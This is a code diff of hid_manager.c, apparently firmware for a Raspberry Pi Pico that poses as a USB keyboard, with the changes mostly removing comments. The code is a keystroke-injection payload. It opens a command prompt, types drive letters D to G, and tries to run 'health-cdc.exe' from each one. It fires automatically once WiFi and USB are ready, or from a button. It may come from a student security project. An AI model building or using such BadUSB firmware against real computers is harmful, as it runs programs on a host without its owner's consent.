@@ -1,13 +1,3 @@
-/**
- * @file    hid_manager.c
- * @brief   HID keyboard sequence management implementation
- * @author  Team IS-02
- * @date    2025-11-08
- */
-
-/*******************************************************************************
- * INCLUDES
- ******************************************************************************/
 #include "hid_manager.h"
 #include "hid_config.h"
 #include "pico/stdlib.h"
@@ -16,27 +6,14 @@
 #include <stdio.h>
 #include <string.h>
 
-/*******************************************************************************
- * PRIVATE VARIABLES
- ******************************************************************************/
 static hid_manager_state_t g_hid_state = {0};
 static hid_config_t g_hid_config = {0};
 static hid_key_action_t g_sequence[HID_MAX_SEQUENCE_LENGTH] = {0};
 
-/*******************************************************************************
- * PRIVATE FUNCTION PROTOTYPES
- ******************************************************************************/
 static void hid_check_manual_trigger(void);
 static void hid_check_auto_trigger(bool wifi_connected, bool usb_mounted);
 static void hid_execute_sequence(void);
 
-/*******************************************************************************
- * PUBLIC FUNCTION IMPLEMENTATIONS
- ******************************************************************************/
-
-/**
- * @brief Initialize HID manager
- */
 bool hid_manager_init(const hid_config_t *config)
 {
     if (config == NULL)
@@ -80,9 +57,6 @@ bool hid_manager_init(const hid_config_t *config)
     return true;
 }
 
-/**
- * @brief Build default keyboard sequence
- */
 void hid_manager_build_sequence(void)
 {
     printf("HID Manager: Building keyboard sequence...\n");
@@ -96,13 +70,11 @@ void hid_manager_build_sequence(void)
     hid_manager_add_key(0, HID_KEY_D, 1);
     hid_manager_add_key(0, HID_KEY_ENTER, 60);  // Delay to Wait for CMD to open
     
-    /* Try health-cdc.exe on multiple drive letters */
+    /* Try find health-cdc.exe on multiple drive letters */
     char drives[] = "DEFG";
     for (int d = 0; d < 4; d++)
     {
-        /* Type drive letter with colon (e.g., "D:") */
-        hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, 
-                           HID_KEY_A + (drives[d] - 'A'), 1);
+        hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_A + (drives[d] - 'A'), 1);
         hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SEMICOLON, 1);
         
         // Type "health-cdc.exe"
@@ -139,9 +111,6 @@ void hid_manager_build_sequence(void)
     printf("HID Manager: Sequence built (%u actions)\n", g_hid_state.sequence_length);
 }
 
-/**
- * @brief Start HID sequence manually
- */
 bool hid_manager_start_sequence(void)
 {
     if (g_hid_state.is_running)
@@ -167,9 +136,6 @@ bool hid_manager_start_sequence(void)
     return true;
 }
 
-/**
- * @brief Stop HID sequence
- */
 void hid_manager_stop_sequence(void)
 {
     if (g_hid_state.is_running)
@@ -180,9 +146,6 @@ void hid_manager_stop_sequence(void)
     }
 }
 
-/**
- * @brief HID task - main periodic task
- */
 void hid_manager_task(bool wifi_connected, bool usb_mounted)
 {
     /* Check auto-trigger conditions */
@@ -204,33 +167,21 @@ void hid_manager_task(bool wifi_connected, bool usb_mounted)
     }
 }
 
-/**
- * @brief Get current HID status
- */
 hid_status_t hid_manager_get_status(void)
 {
     return g_hid_state.status;
 }
 
-/**
- * @brief Get HID manager state
- */
 const hid_manager_state_t *hid_manager_get_state(void)
 {
     return &g_hid_state;
 }
 
-/**
- * @brief Check if sequence is running
- */
 bool hid_manager_is_running(void)
 {
     return g_hid_state.is_running;
 }
 
-/**
- * @brief Reset HID manager
- */
 void hid_manager_reset(void)
 {
     g_hid_state.is_running = false;
@@ -240,9 +191,6 @@ void hid_manager_reset(void)
     g_hid_state.auto_trigger_start_time = 0;
 }
 
-/**
- * @brief Add key action to sequence
- */
 bool hid_manager_add_key(uint8_t modifier, uint8_t key, uint16_t delay_count)
 {
     if (g_hid_state.sequence_length >= HID_MAX_SEQUENCE_LENGTH - 2)
@@ -273,9 +221,6 @@ bool hid_manager_add_key(uint8_t modifier, uint8_t key, uint16_t delay_count)
     return true;
 }
 
-/**
- * @brief Clear keyboard sequence
- */
 void hid_manager_clear_sequence(void)
 {
     memset(g_sequence, 0, sizeof(g_sequence));
@@ -283,29 +228,16 @@ void hid_manager_clear_sequence(void)
     g_hid_state.sequence_index = 0;
 }
 
-/**
- * @brief Get current sequence length
- */
 uint16_t hid_manager_get_sequence_length(void)
 {
     return g_hid_state.sequence_length;
 }
 
-/**
- * @brief Check if auto-trigger has executed
- */
 bool hid_manager_auto_trigger_done(void)
 {
     return g_hid_state.auto_trigger_executed;
 }
 
-/*******************************************************************************
- * PRIVATE FUNCTION IMPLEMENTATIONS
- ******************************************************************************/
-
-/**
- * @brief Check manual trigger button
- */
 static void hid_check_manual_trigger(void)
 {
     static bool last_button_state = true;
@@ -334,9 +266,6 @@ static void hid_check_manual_trigger(void)
     last_button_state = current_state;
 }
 
-/**
- * @brief Check auto-trigger conditions
- */
 static void hid_check_auto_trigger(bool wifi_connected, bool usb_mounted)
 {
     /* Both WiFi and USB must be ready */
@@ -370,19 +299,14 @@ static void hid_check_auto_trigger(bool wifi_connected, bool usb_mounted)
     if (elapsed >= g_hid_config.auto_trigger_delay_ms)
     {
         printf("*** AUTO-TRIGGERING HID SEQUENCE ***\n");
-        
-        // Sequence should already be built from main.c
-        // hid_manager_build_sequence(); 
         hid_manager_start_sequence();
         
         g_hid_state.auto_trigger_executed = true;
-        g_hid_state.status = HID_STATUS_RUNNING; // Status is set in start_sequence, but for clarity
+        // Status is set in start_sequence, but for clarity
+        g_hid_state.status = HID_STATUS_RUNNING; 
     }
 }
 
-/**
- * @brief Execute keyboard sequence
- */
 static void hid_execute_sequence(void)
 {
     /* Check if TinyUSB HID is ready */
@@ -423,13 +347,6 @@ static void hid_execute_sequence(void)
     tud_hid_keyboard_report(REPORT_ID_KEYBOARD, action.modifier, keycode);
 }
 
-/*******************************************************************************
- * TinyUSB CALLBACK IMPLEMENTATIONS
- ******************************************************************************/
-
-/**
- * @brief TinyUSB HID get report callback
- */
 uint16_t tud_hid_get_report_cb(uint8_t itf, 
                                uint8_t report_id, 
                                uint8_t report_type, 
@@ -445,9 +362,6 @@ uint16_t tud_hid_get_report_cb(uint8_t itf,
     return 0;
 }
 
-/**
- * @brief TinyUSB HID set report callback
- */
 void tud_hid_set_report_cb(uint8_t itf, 
                            uint8_t report_id, 
                            uint8_t report_type, 
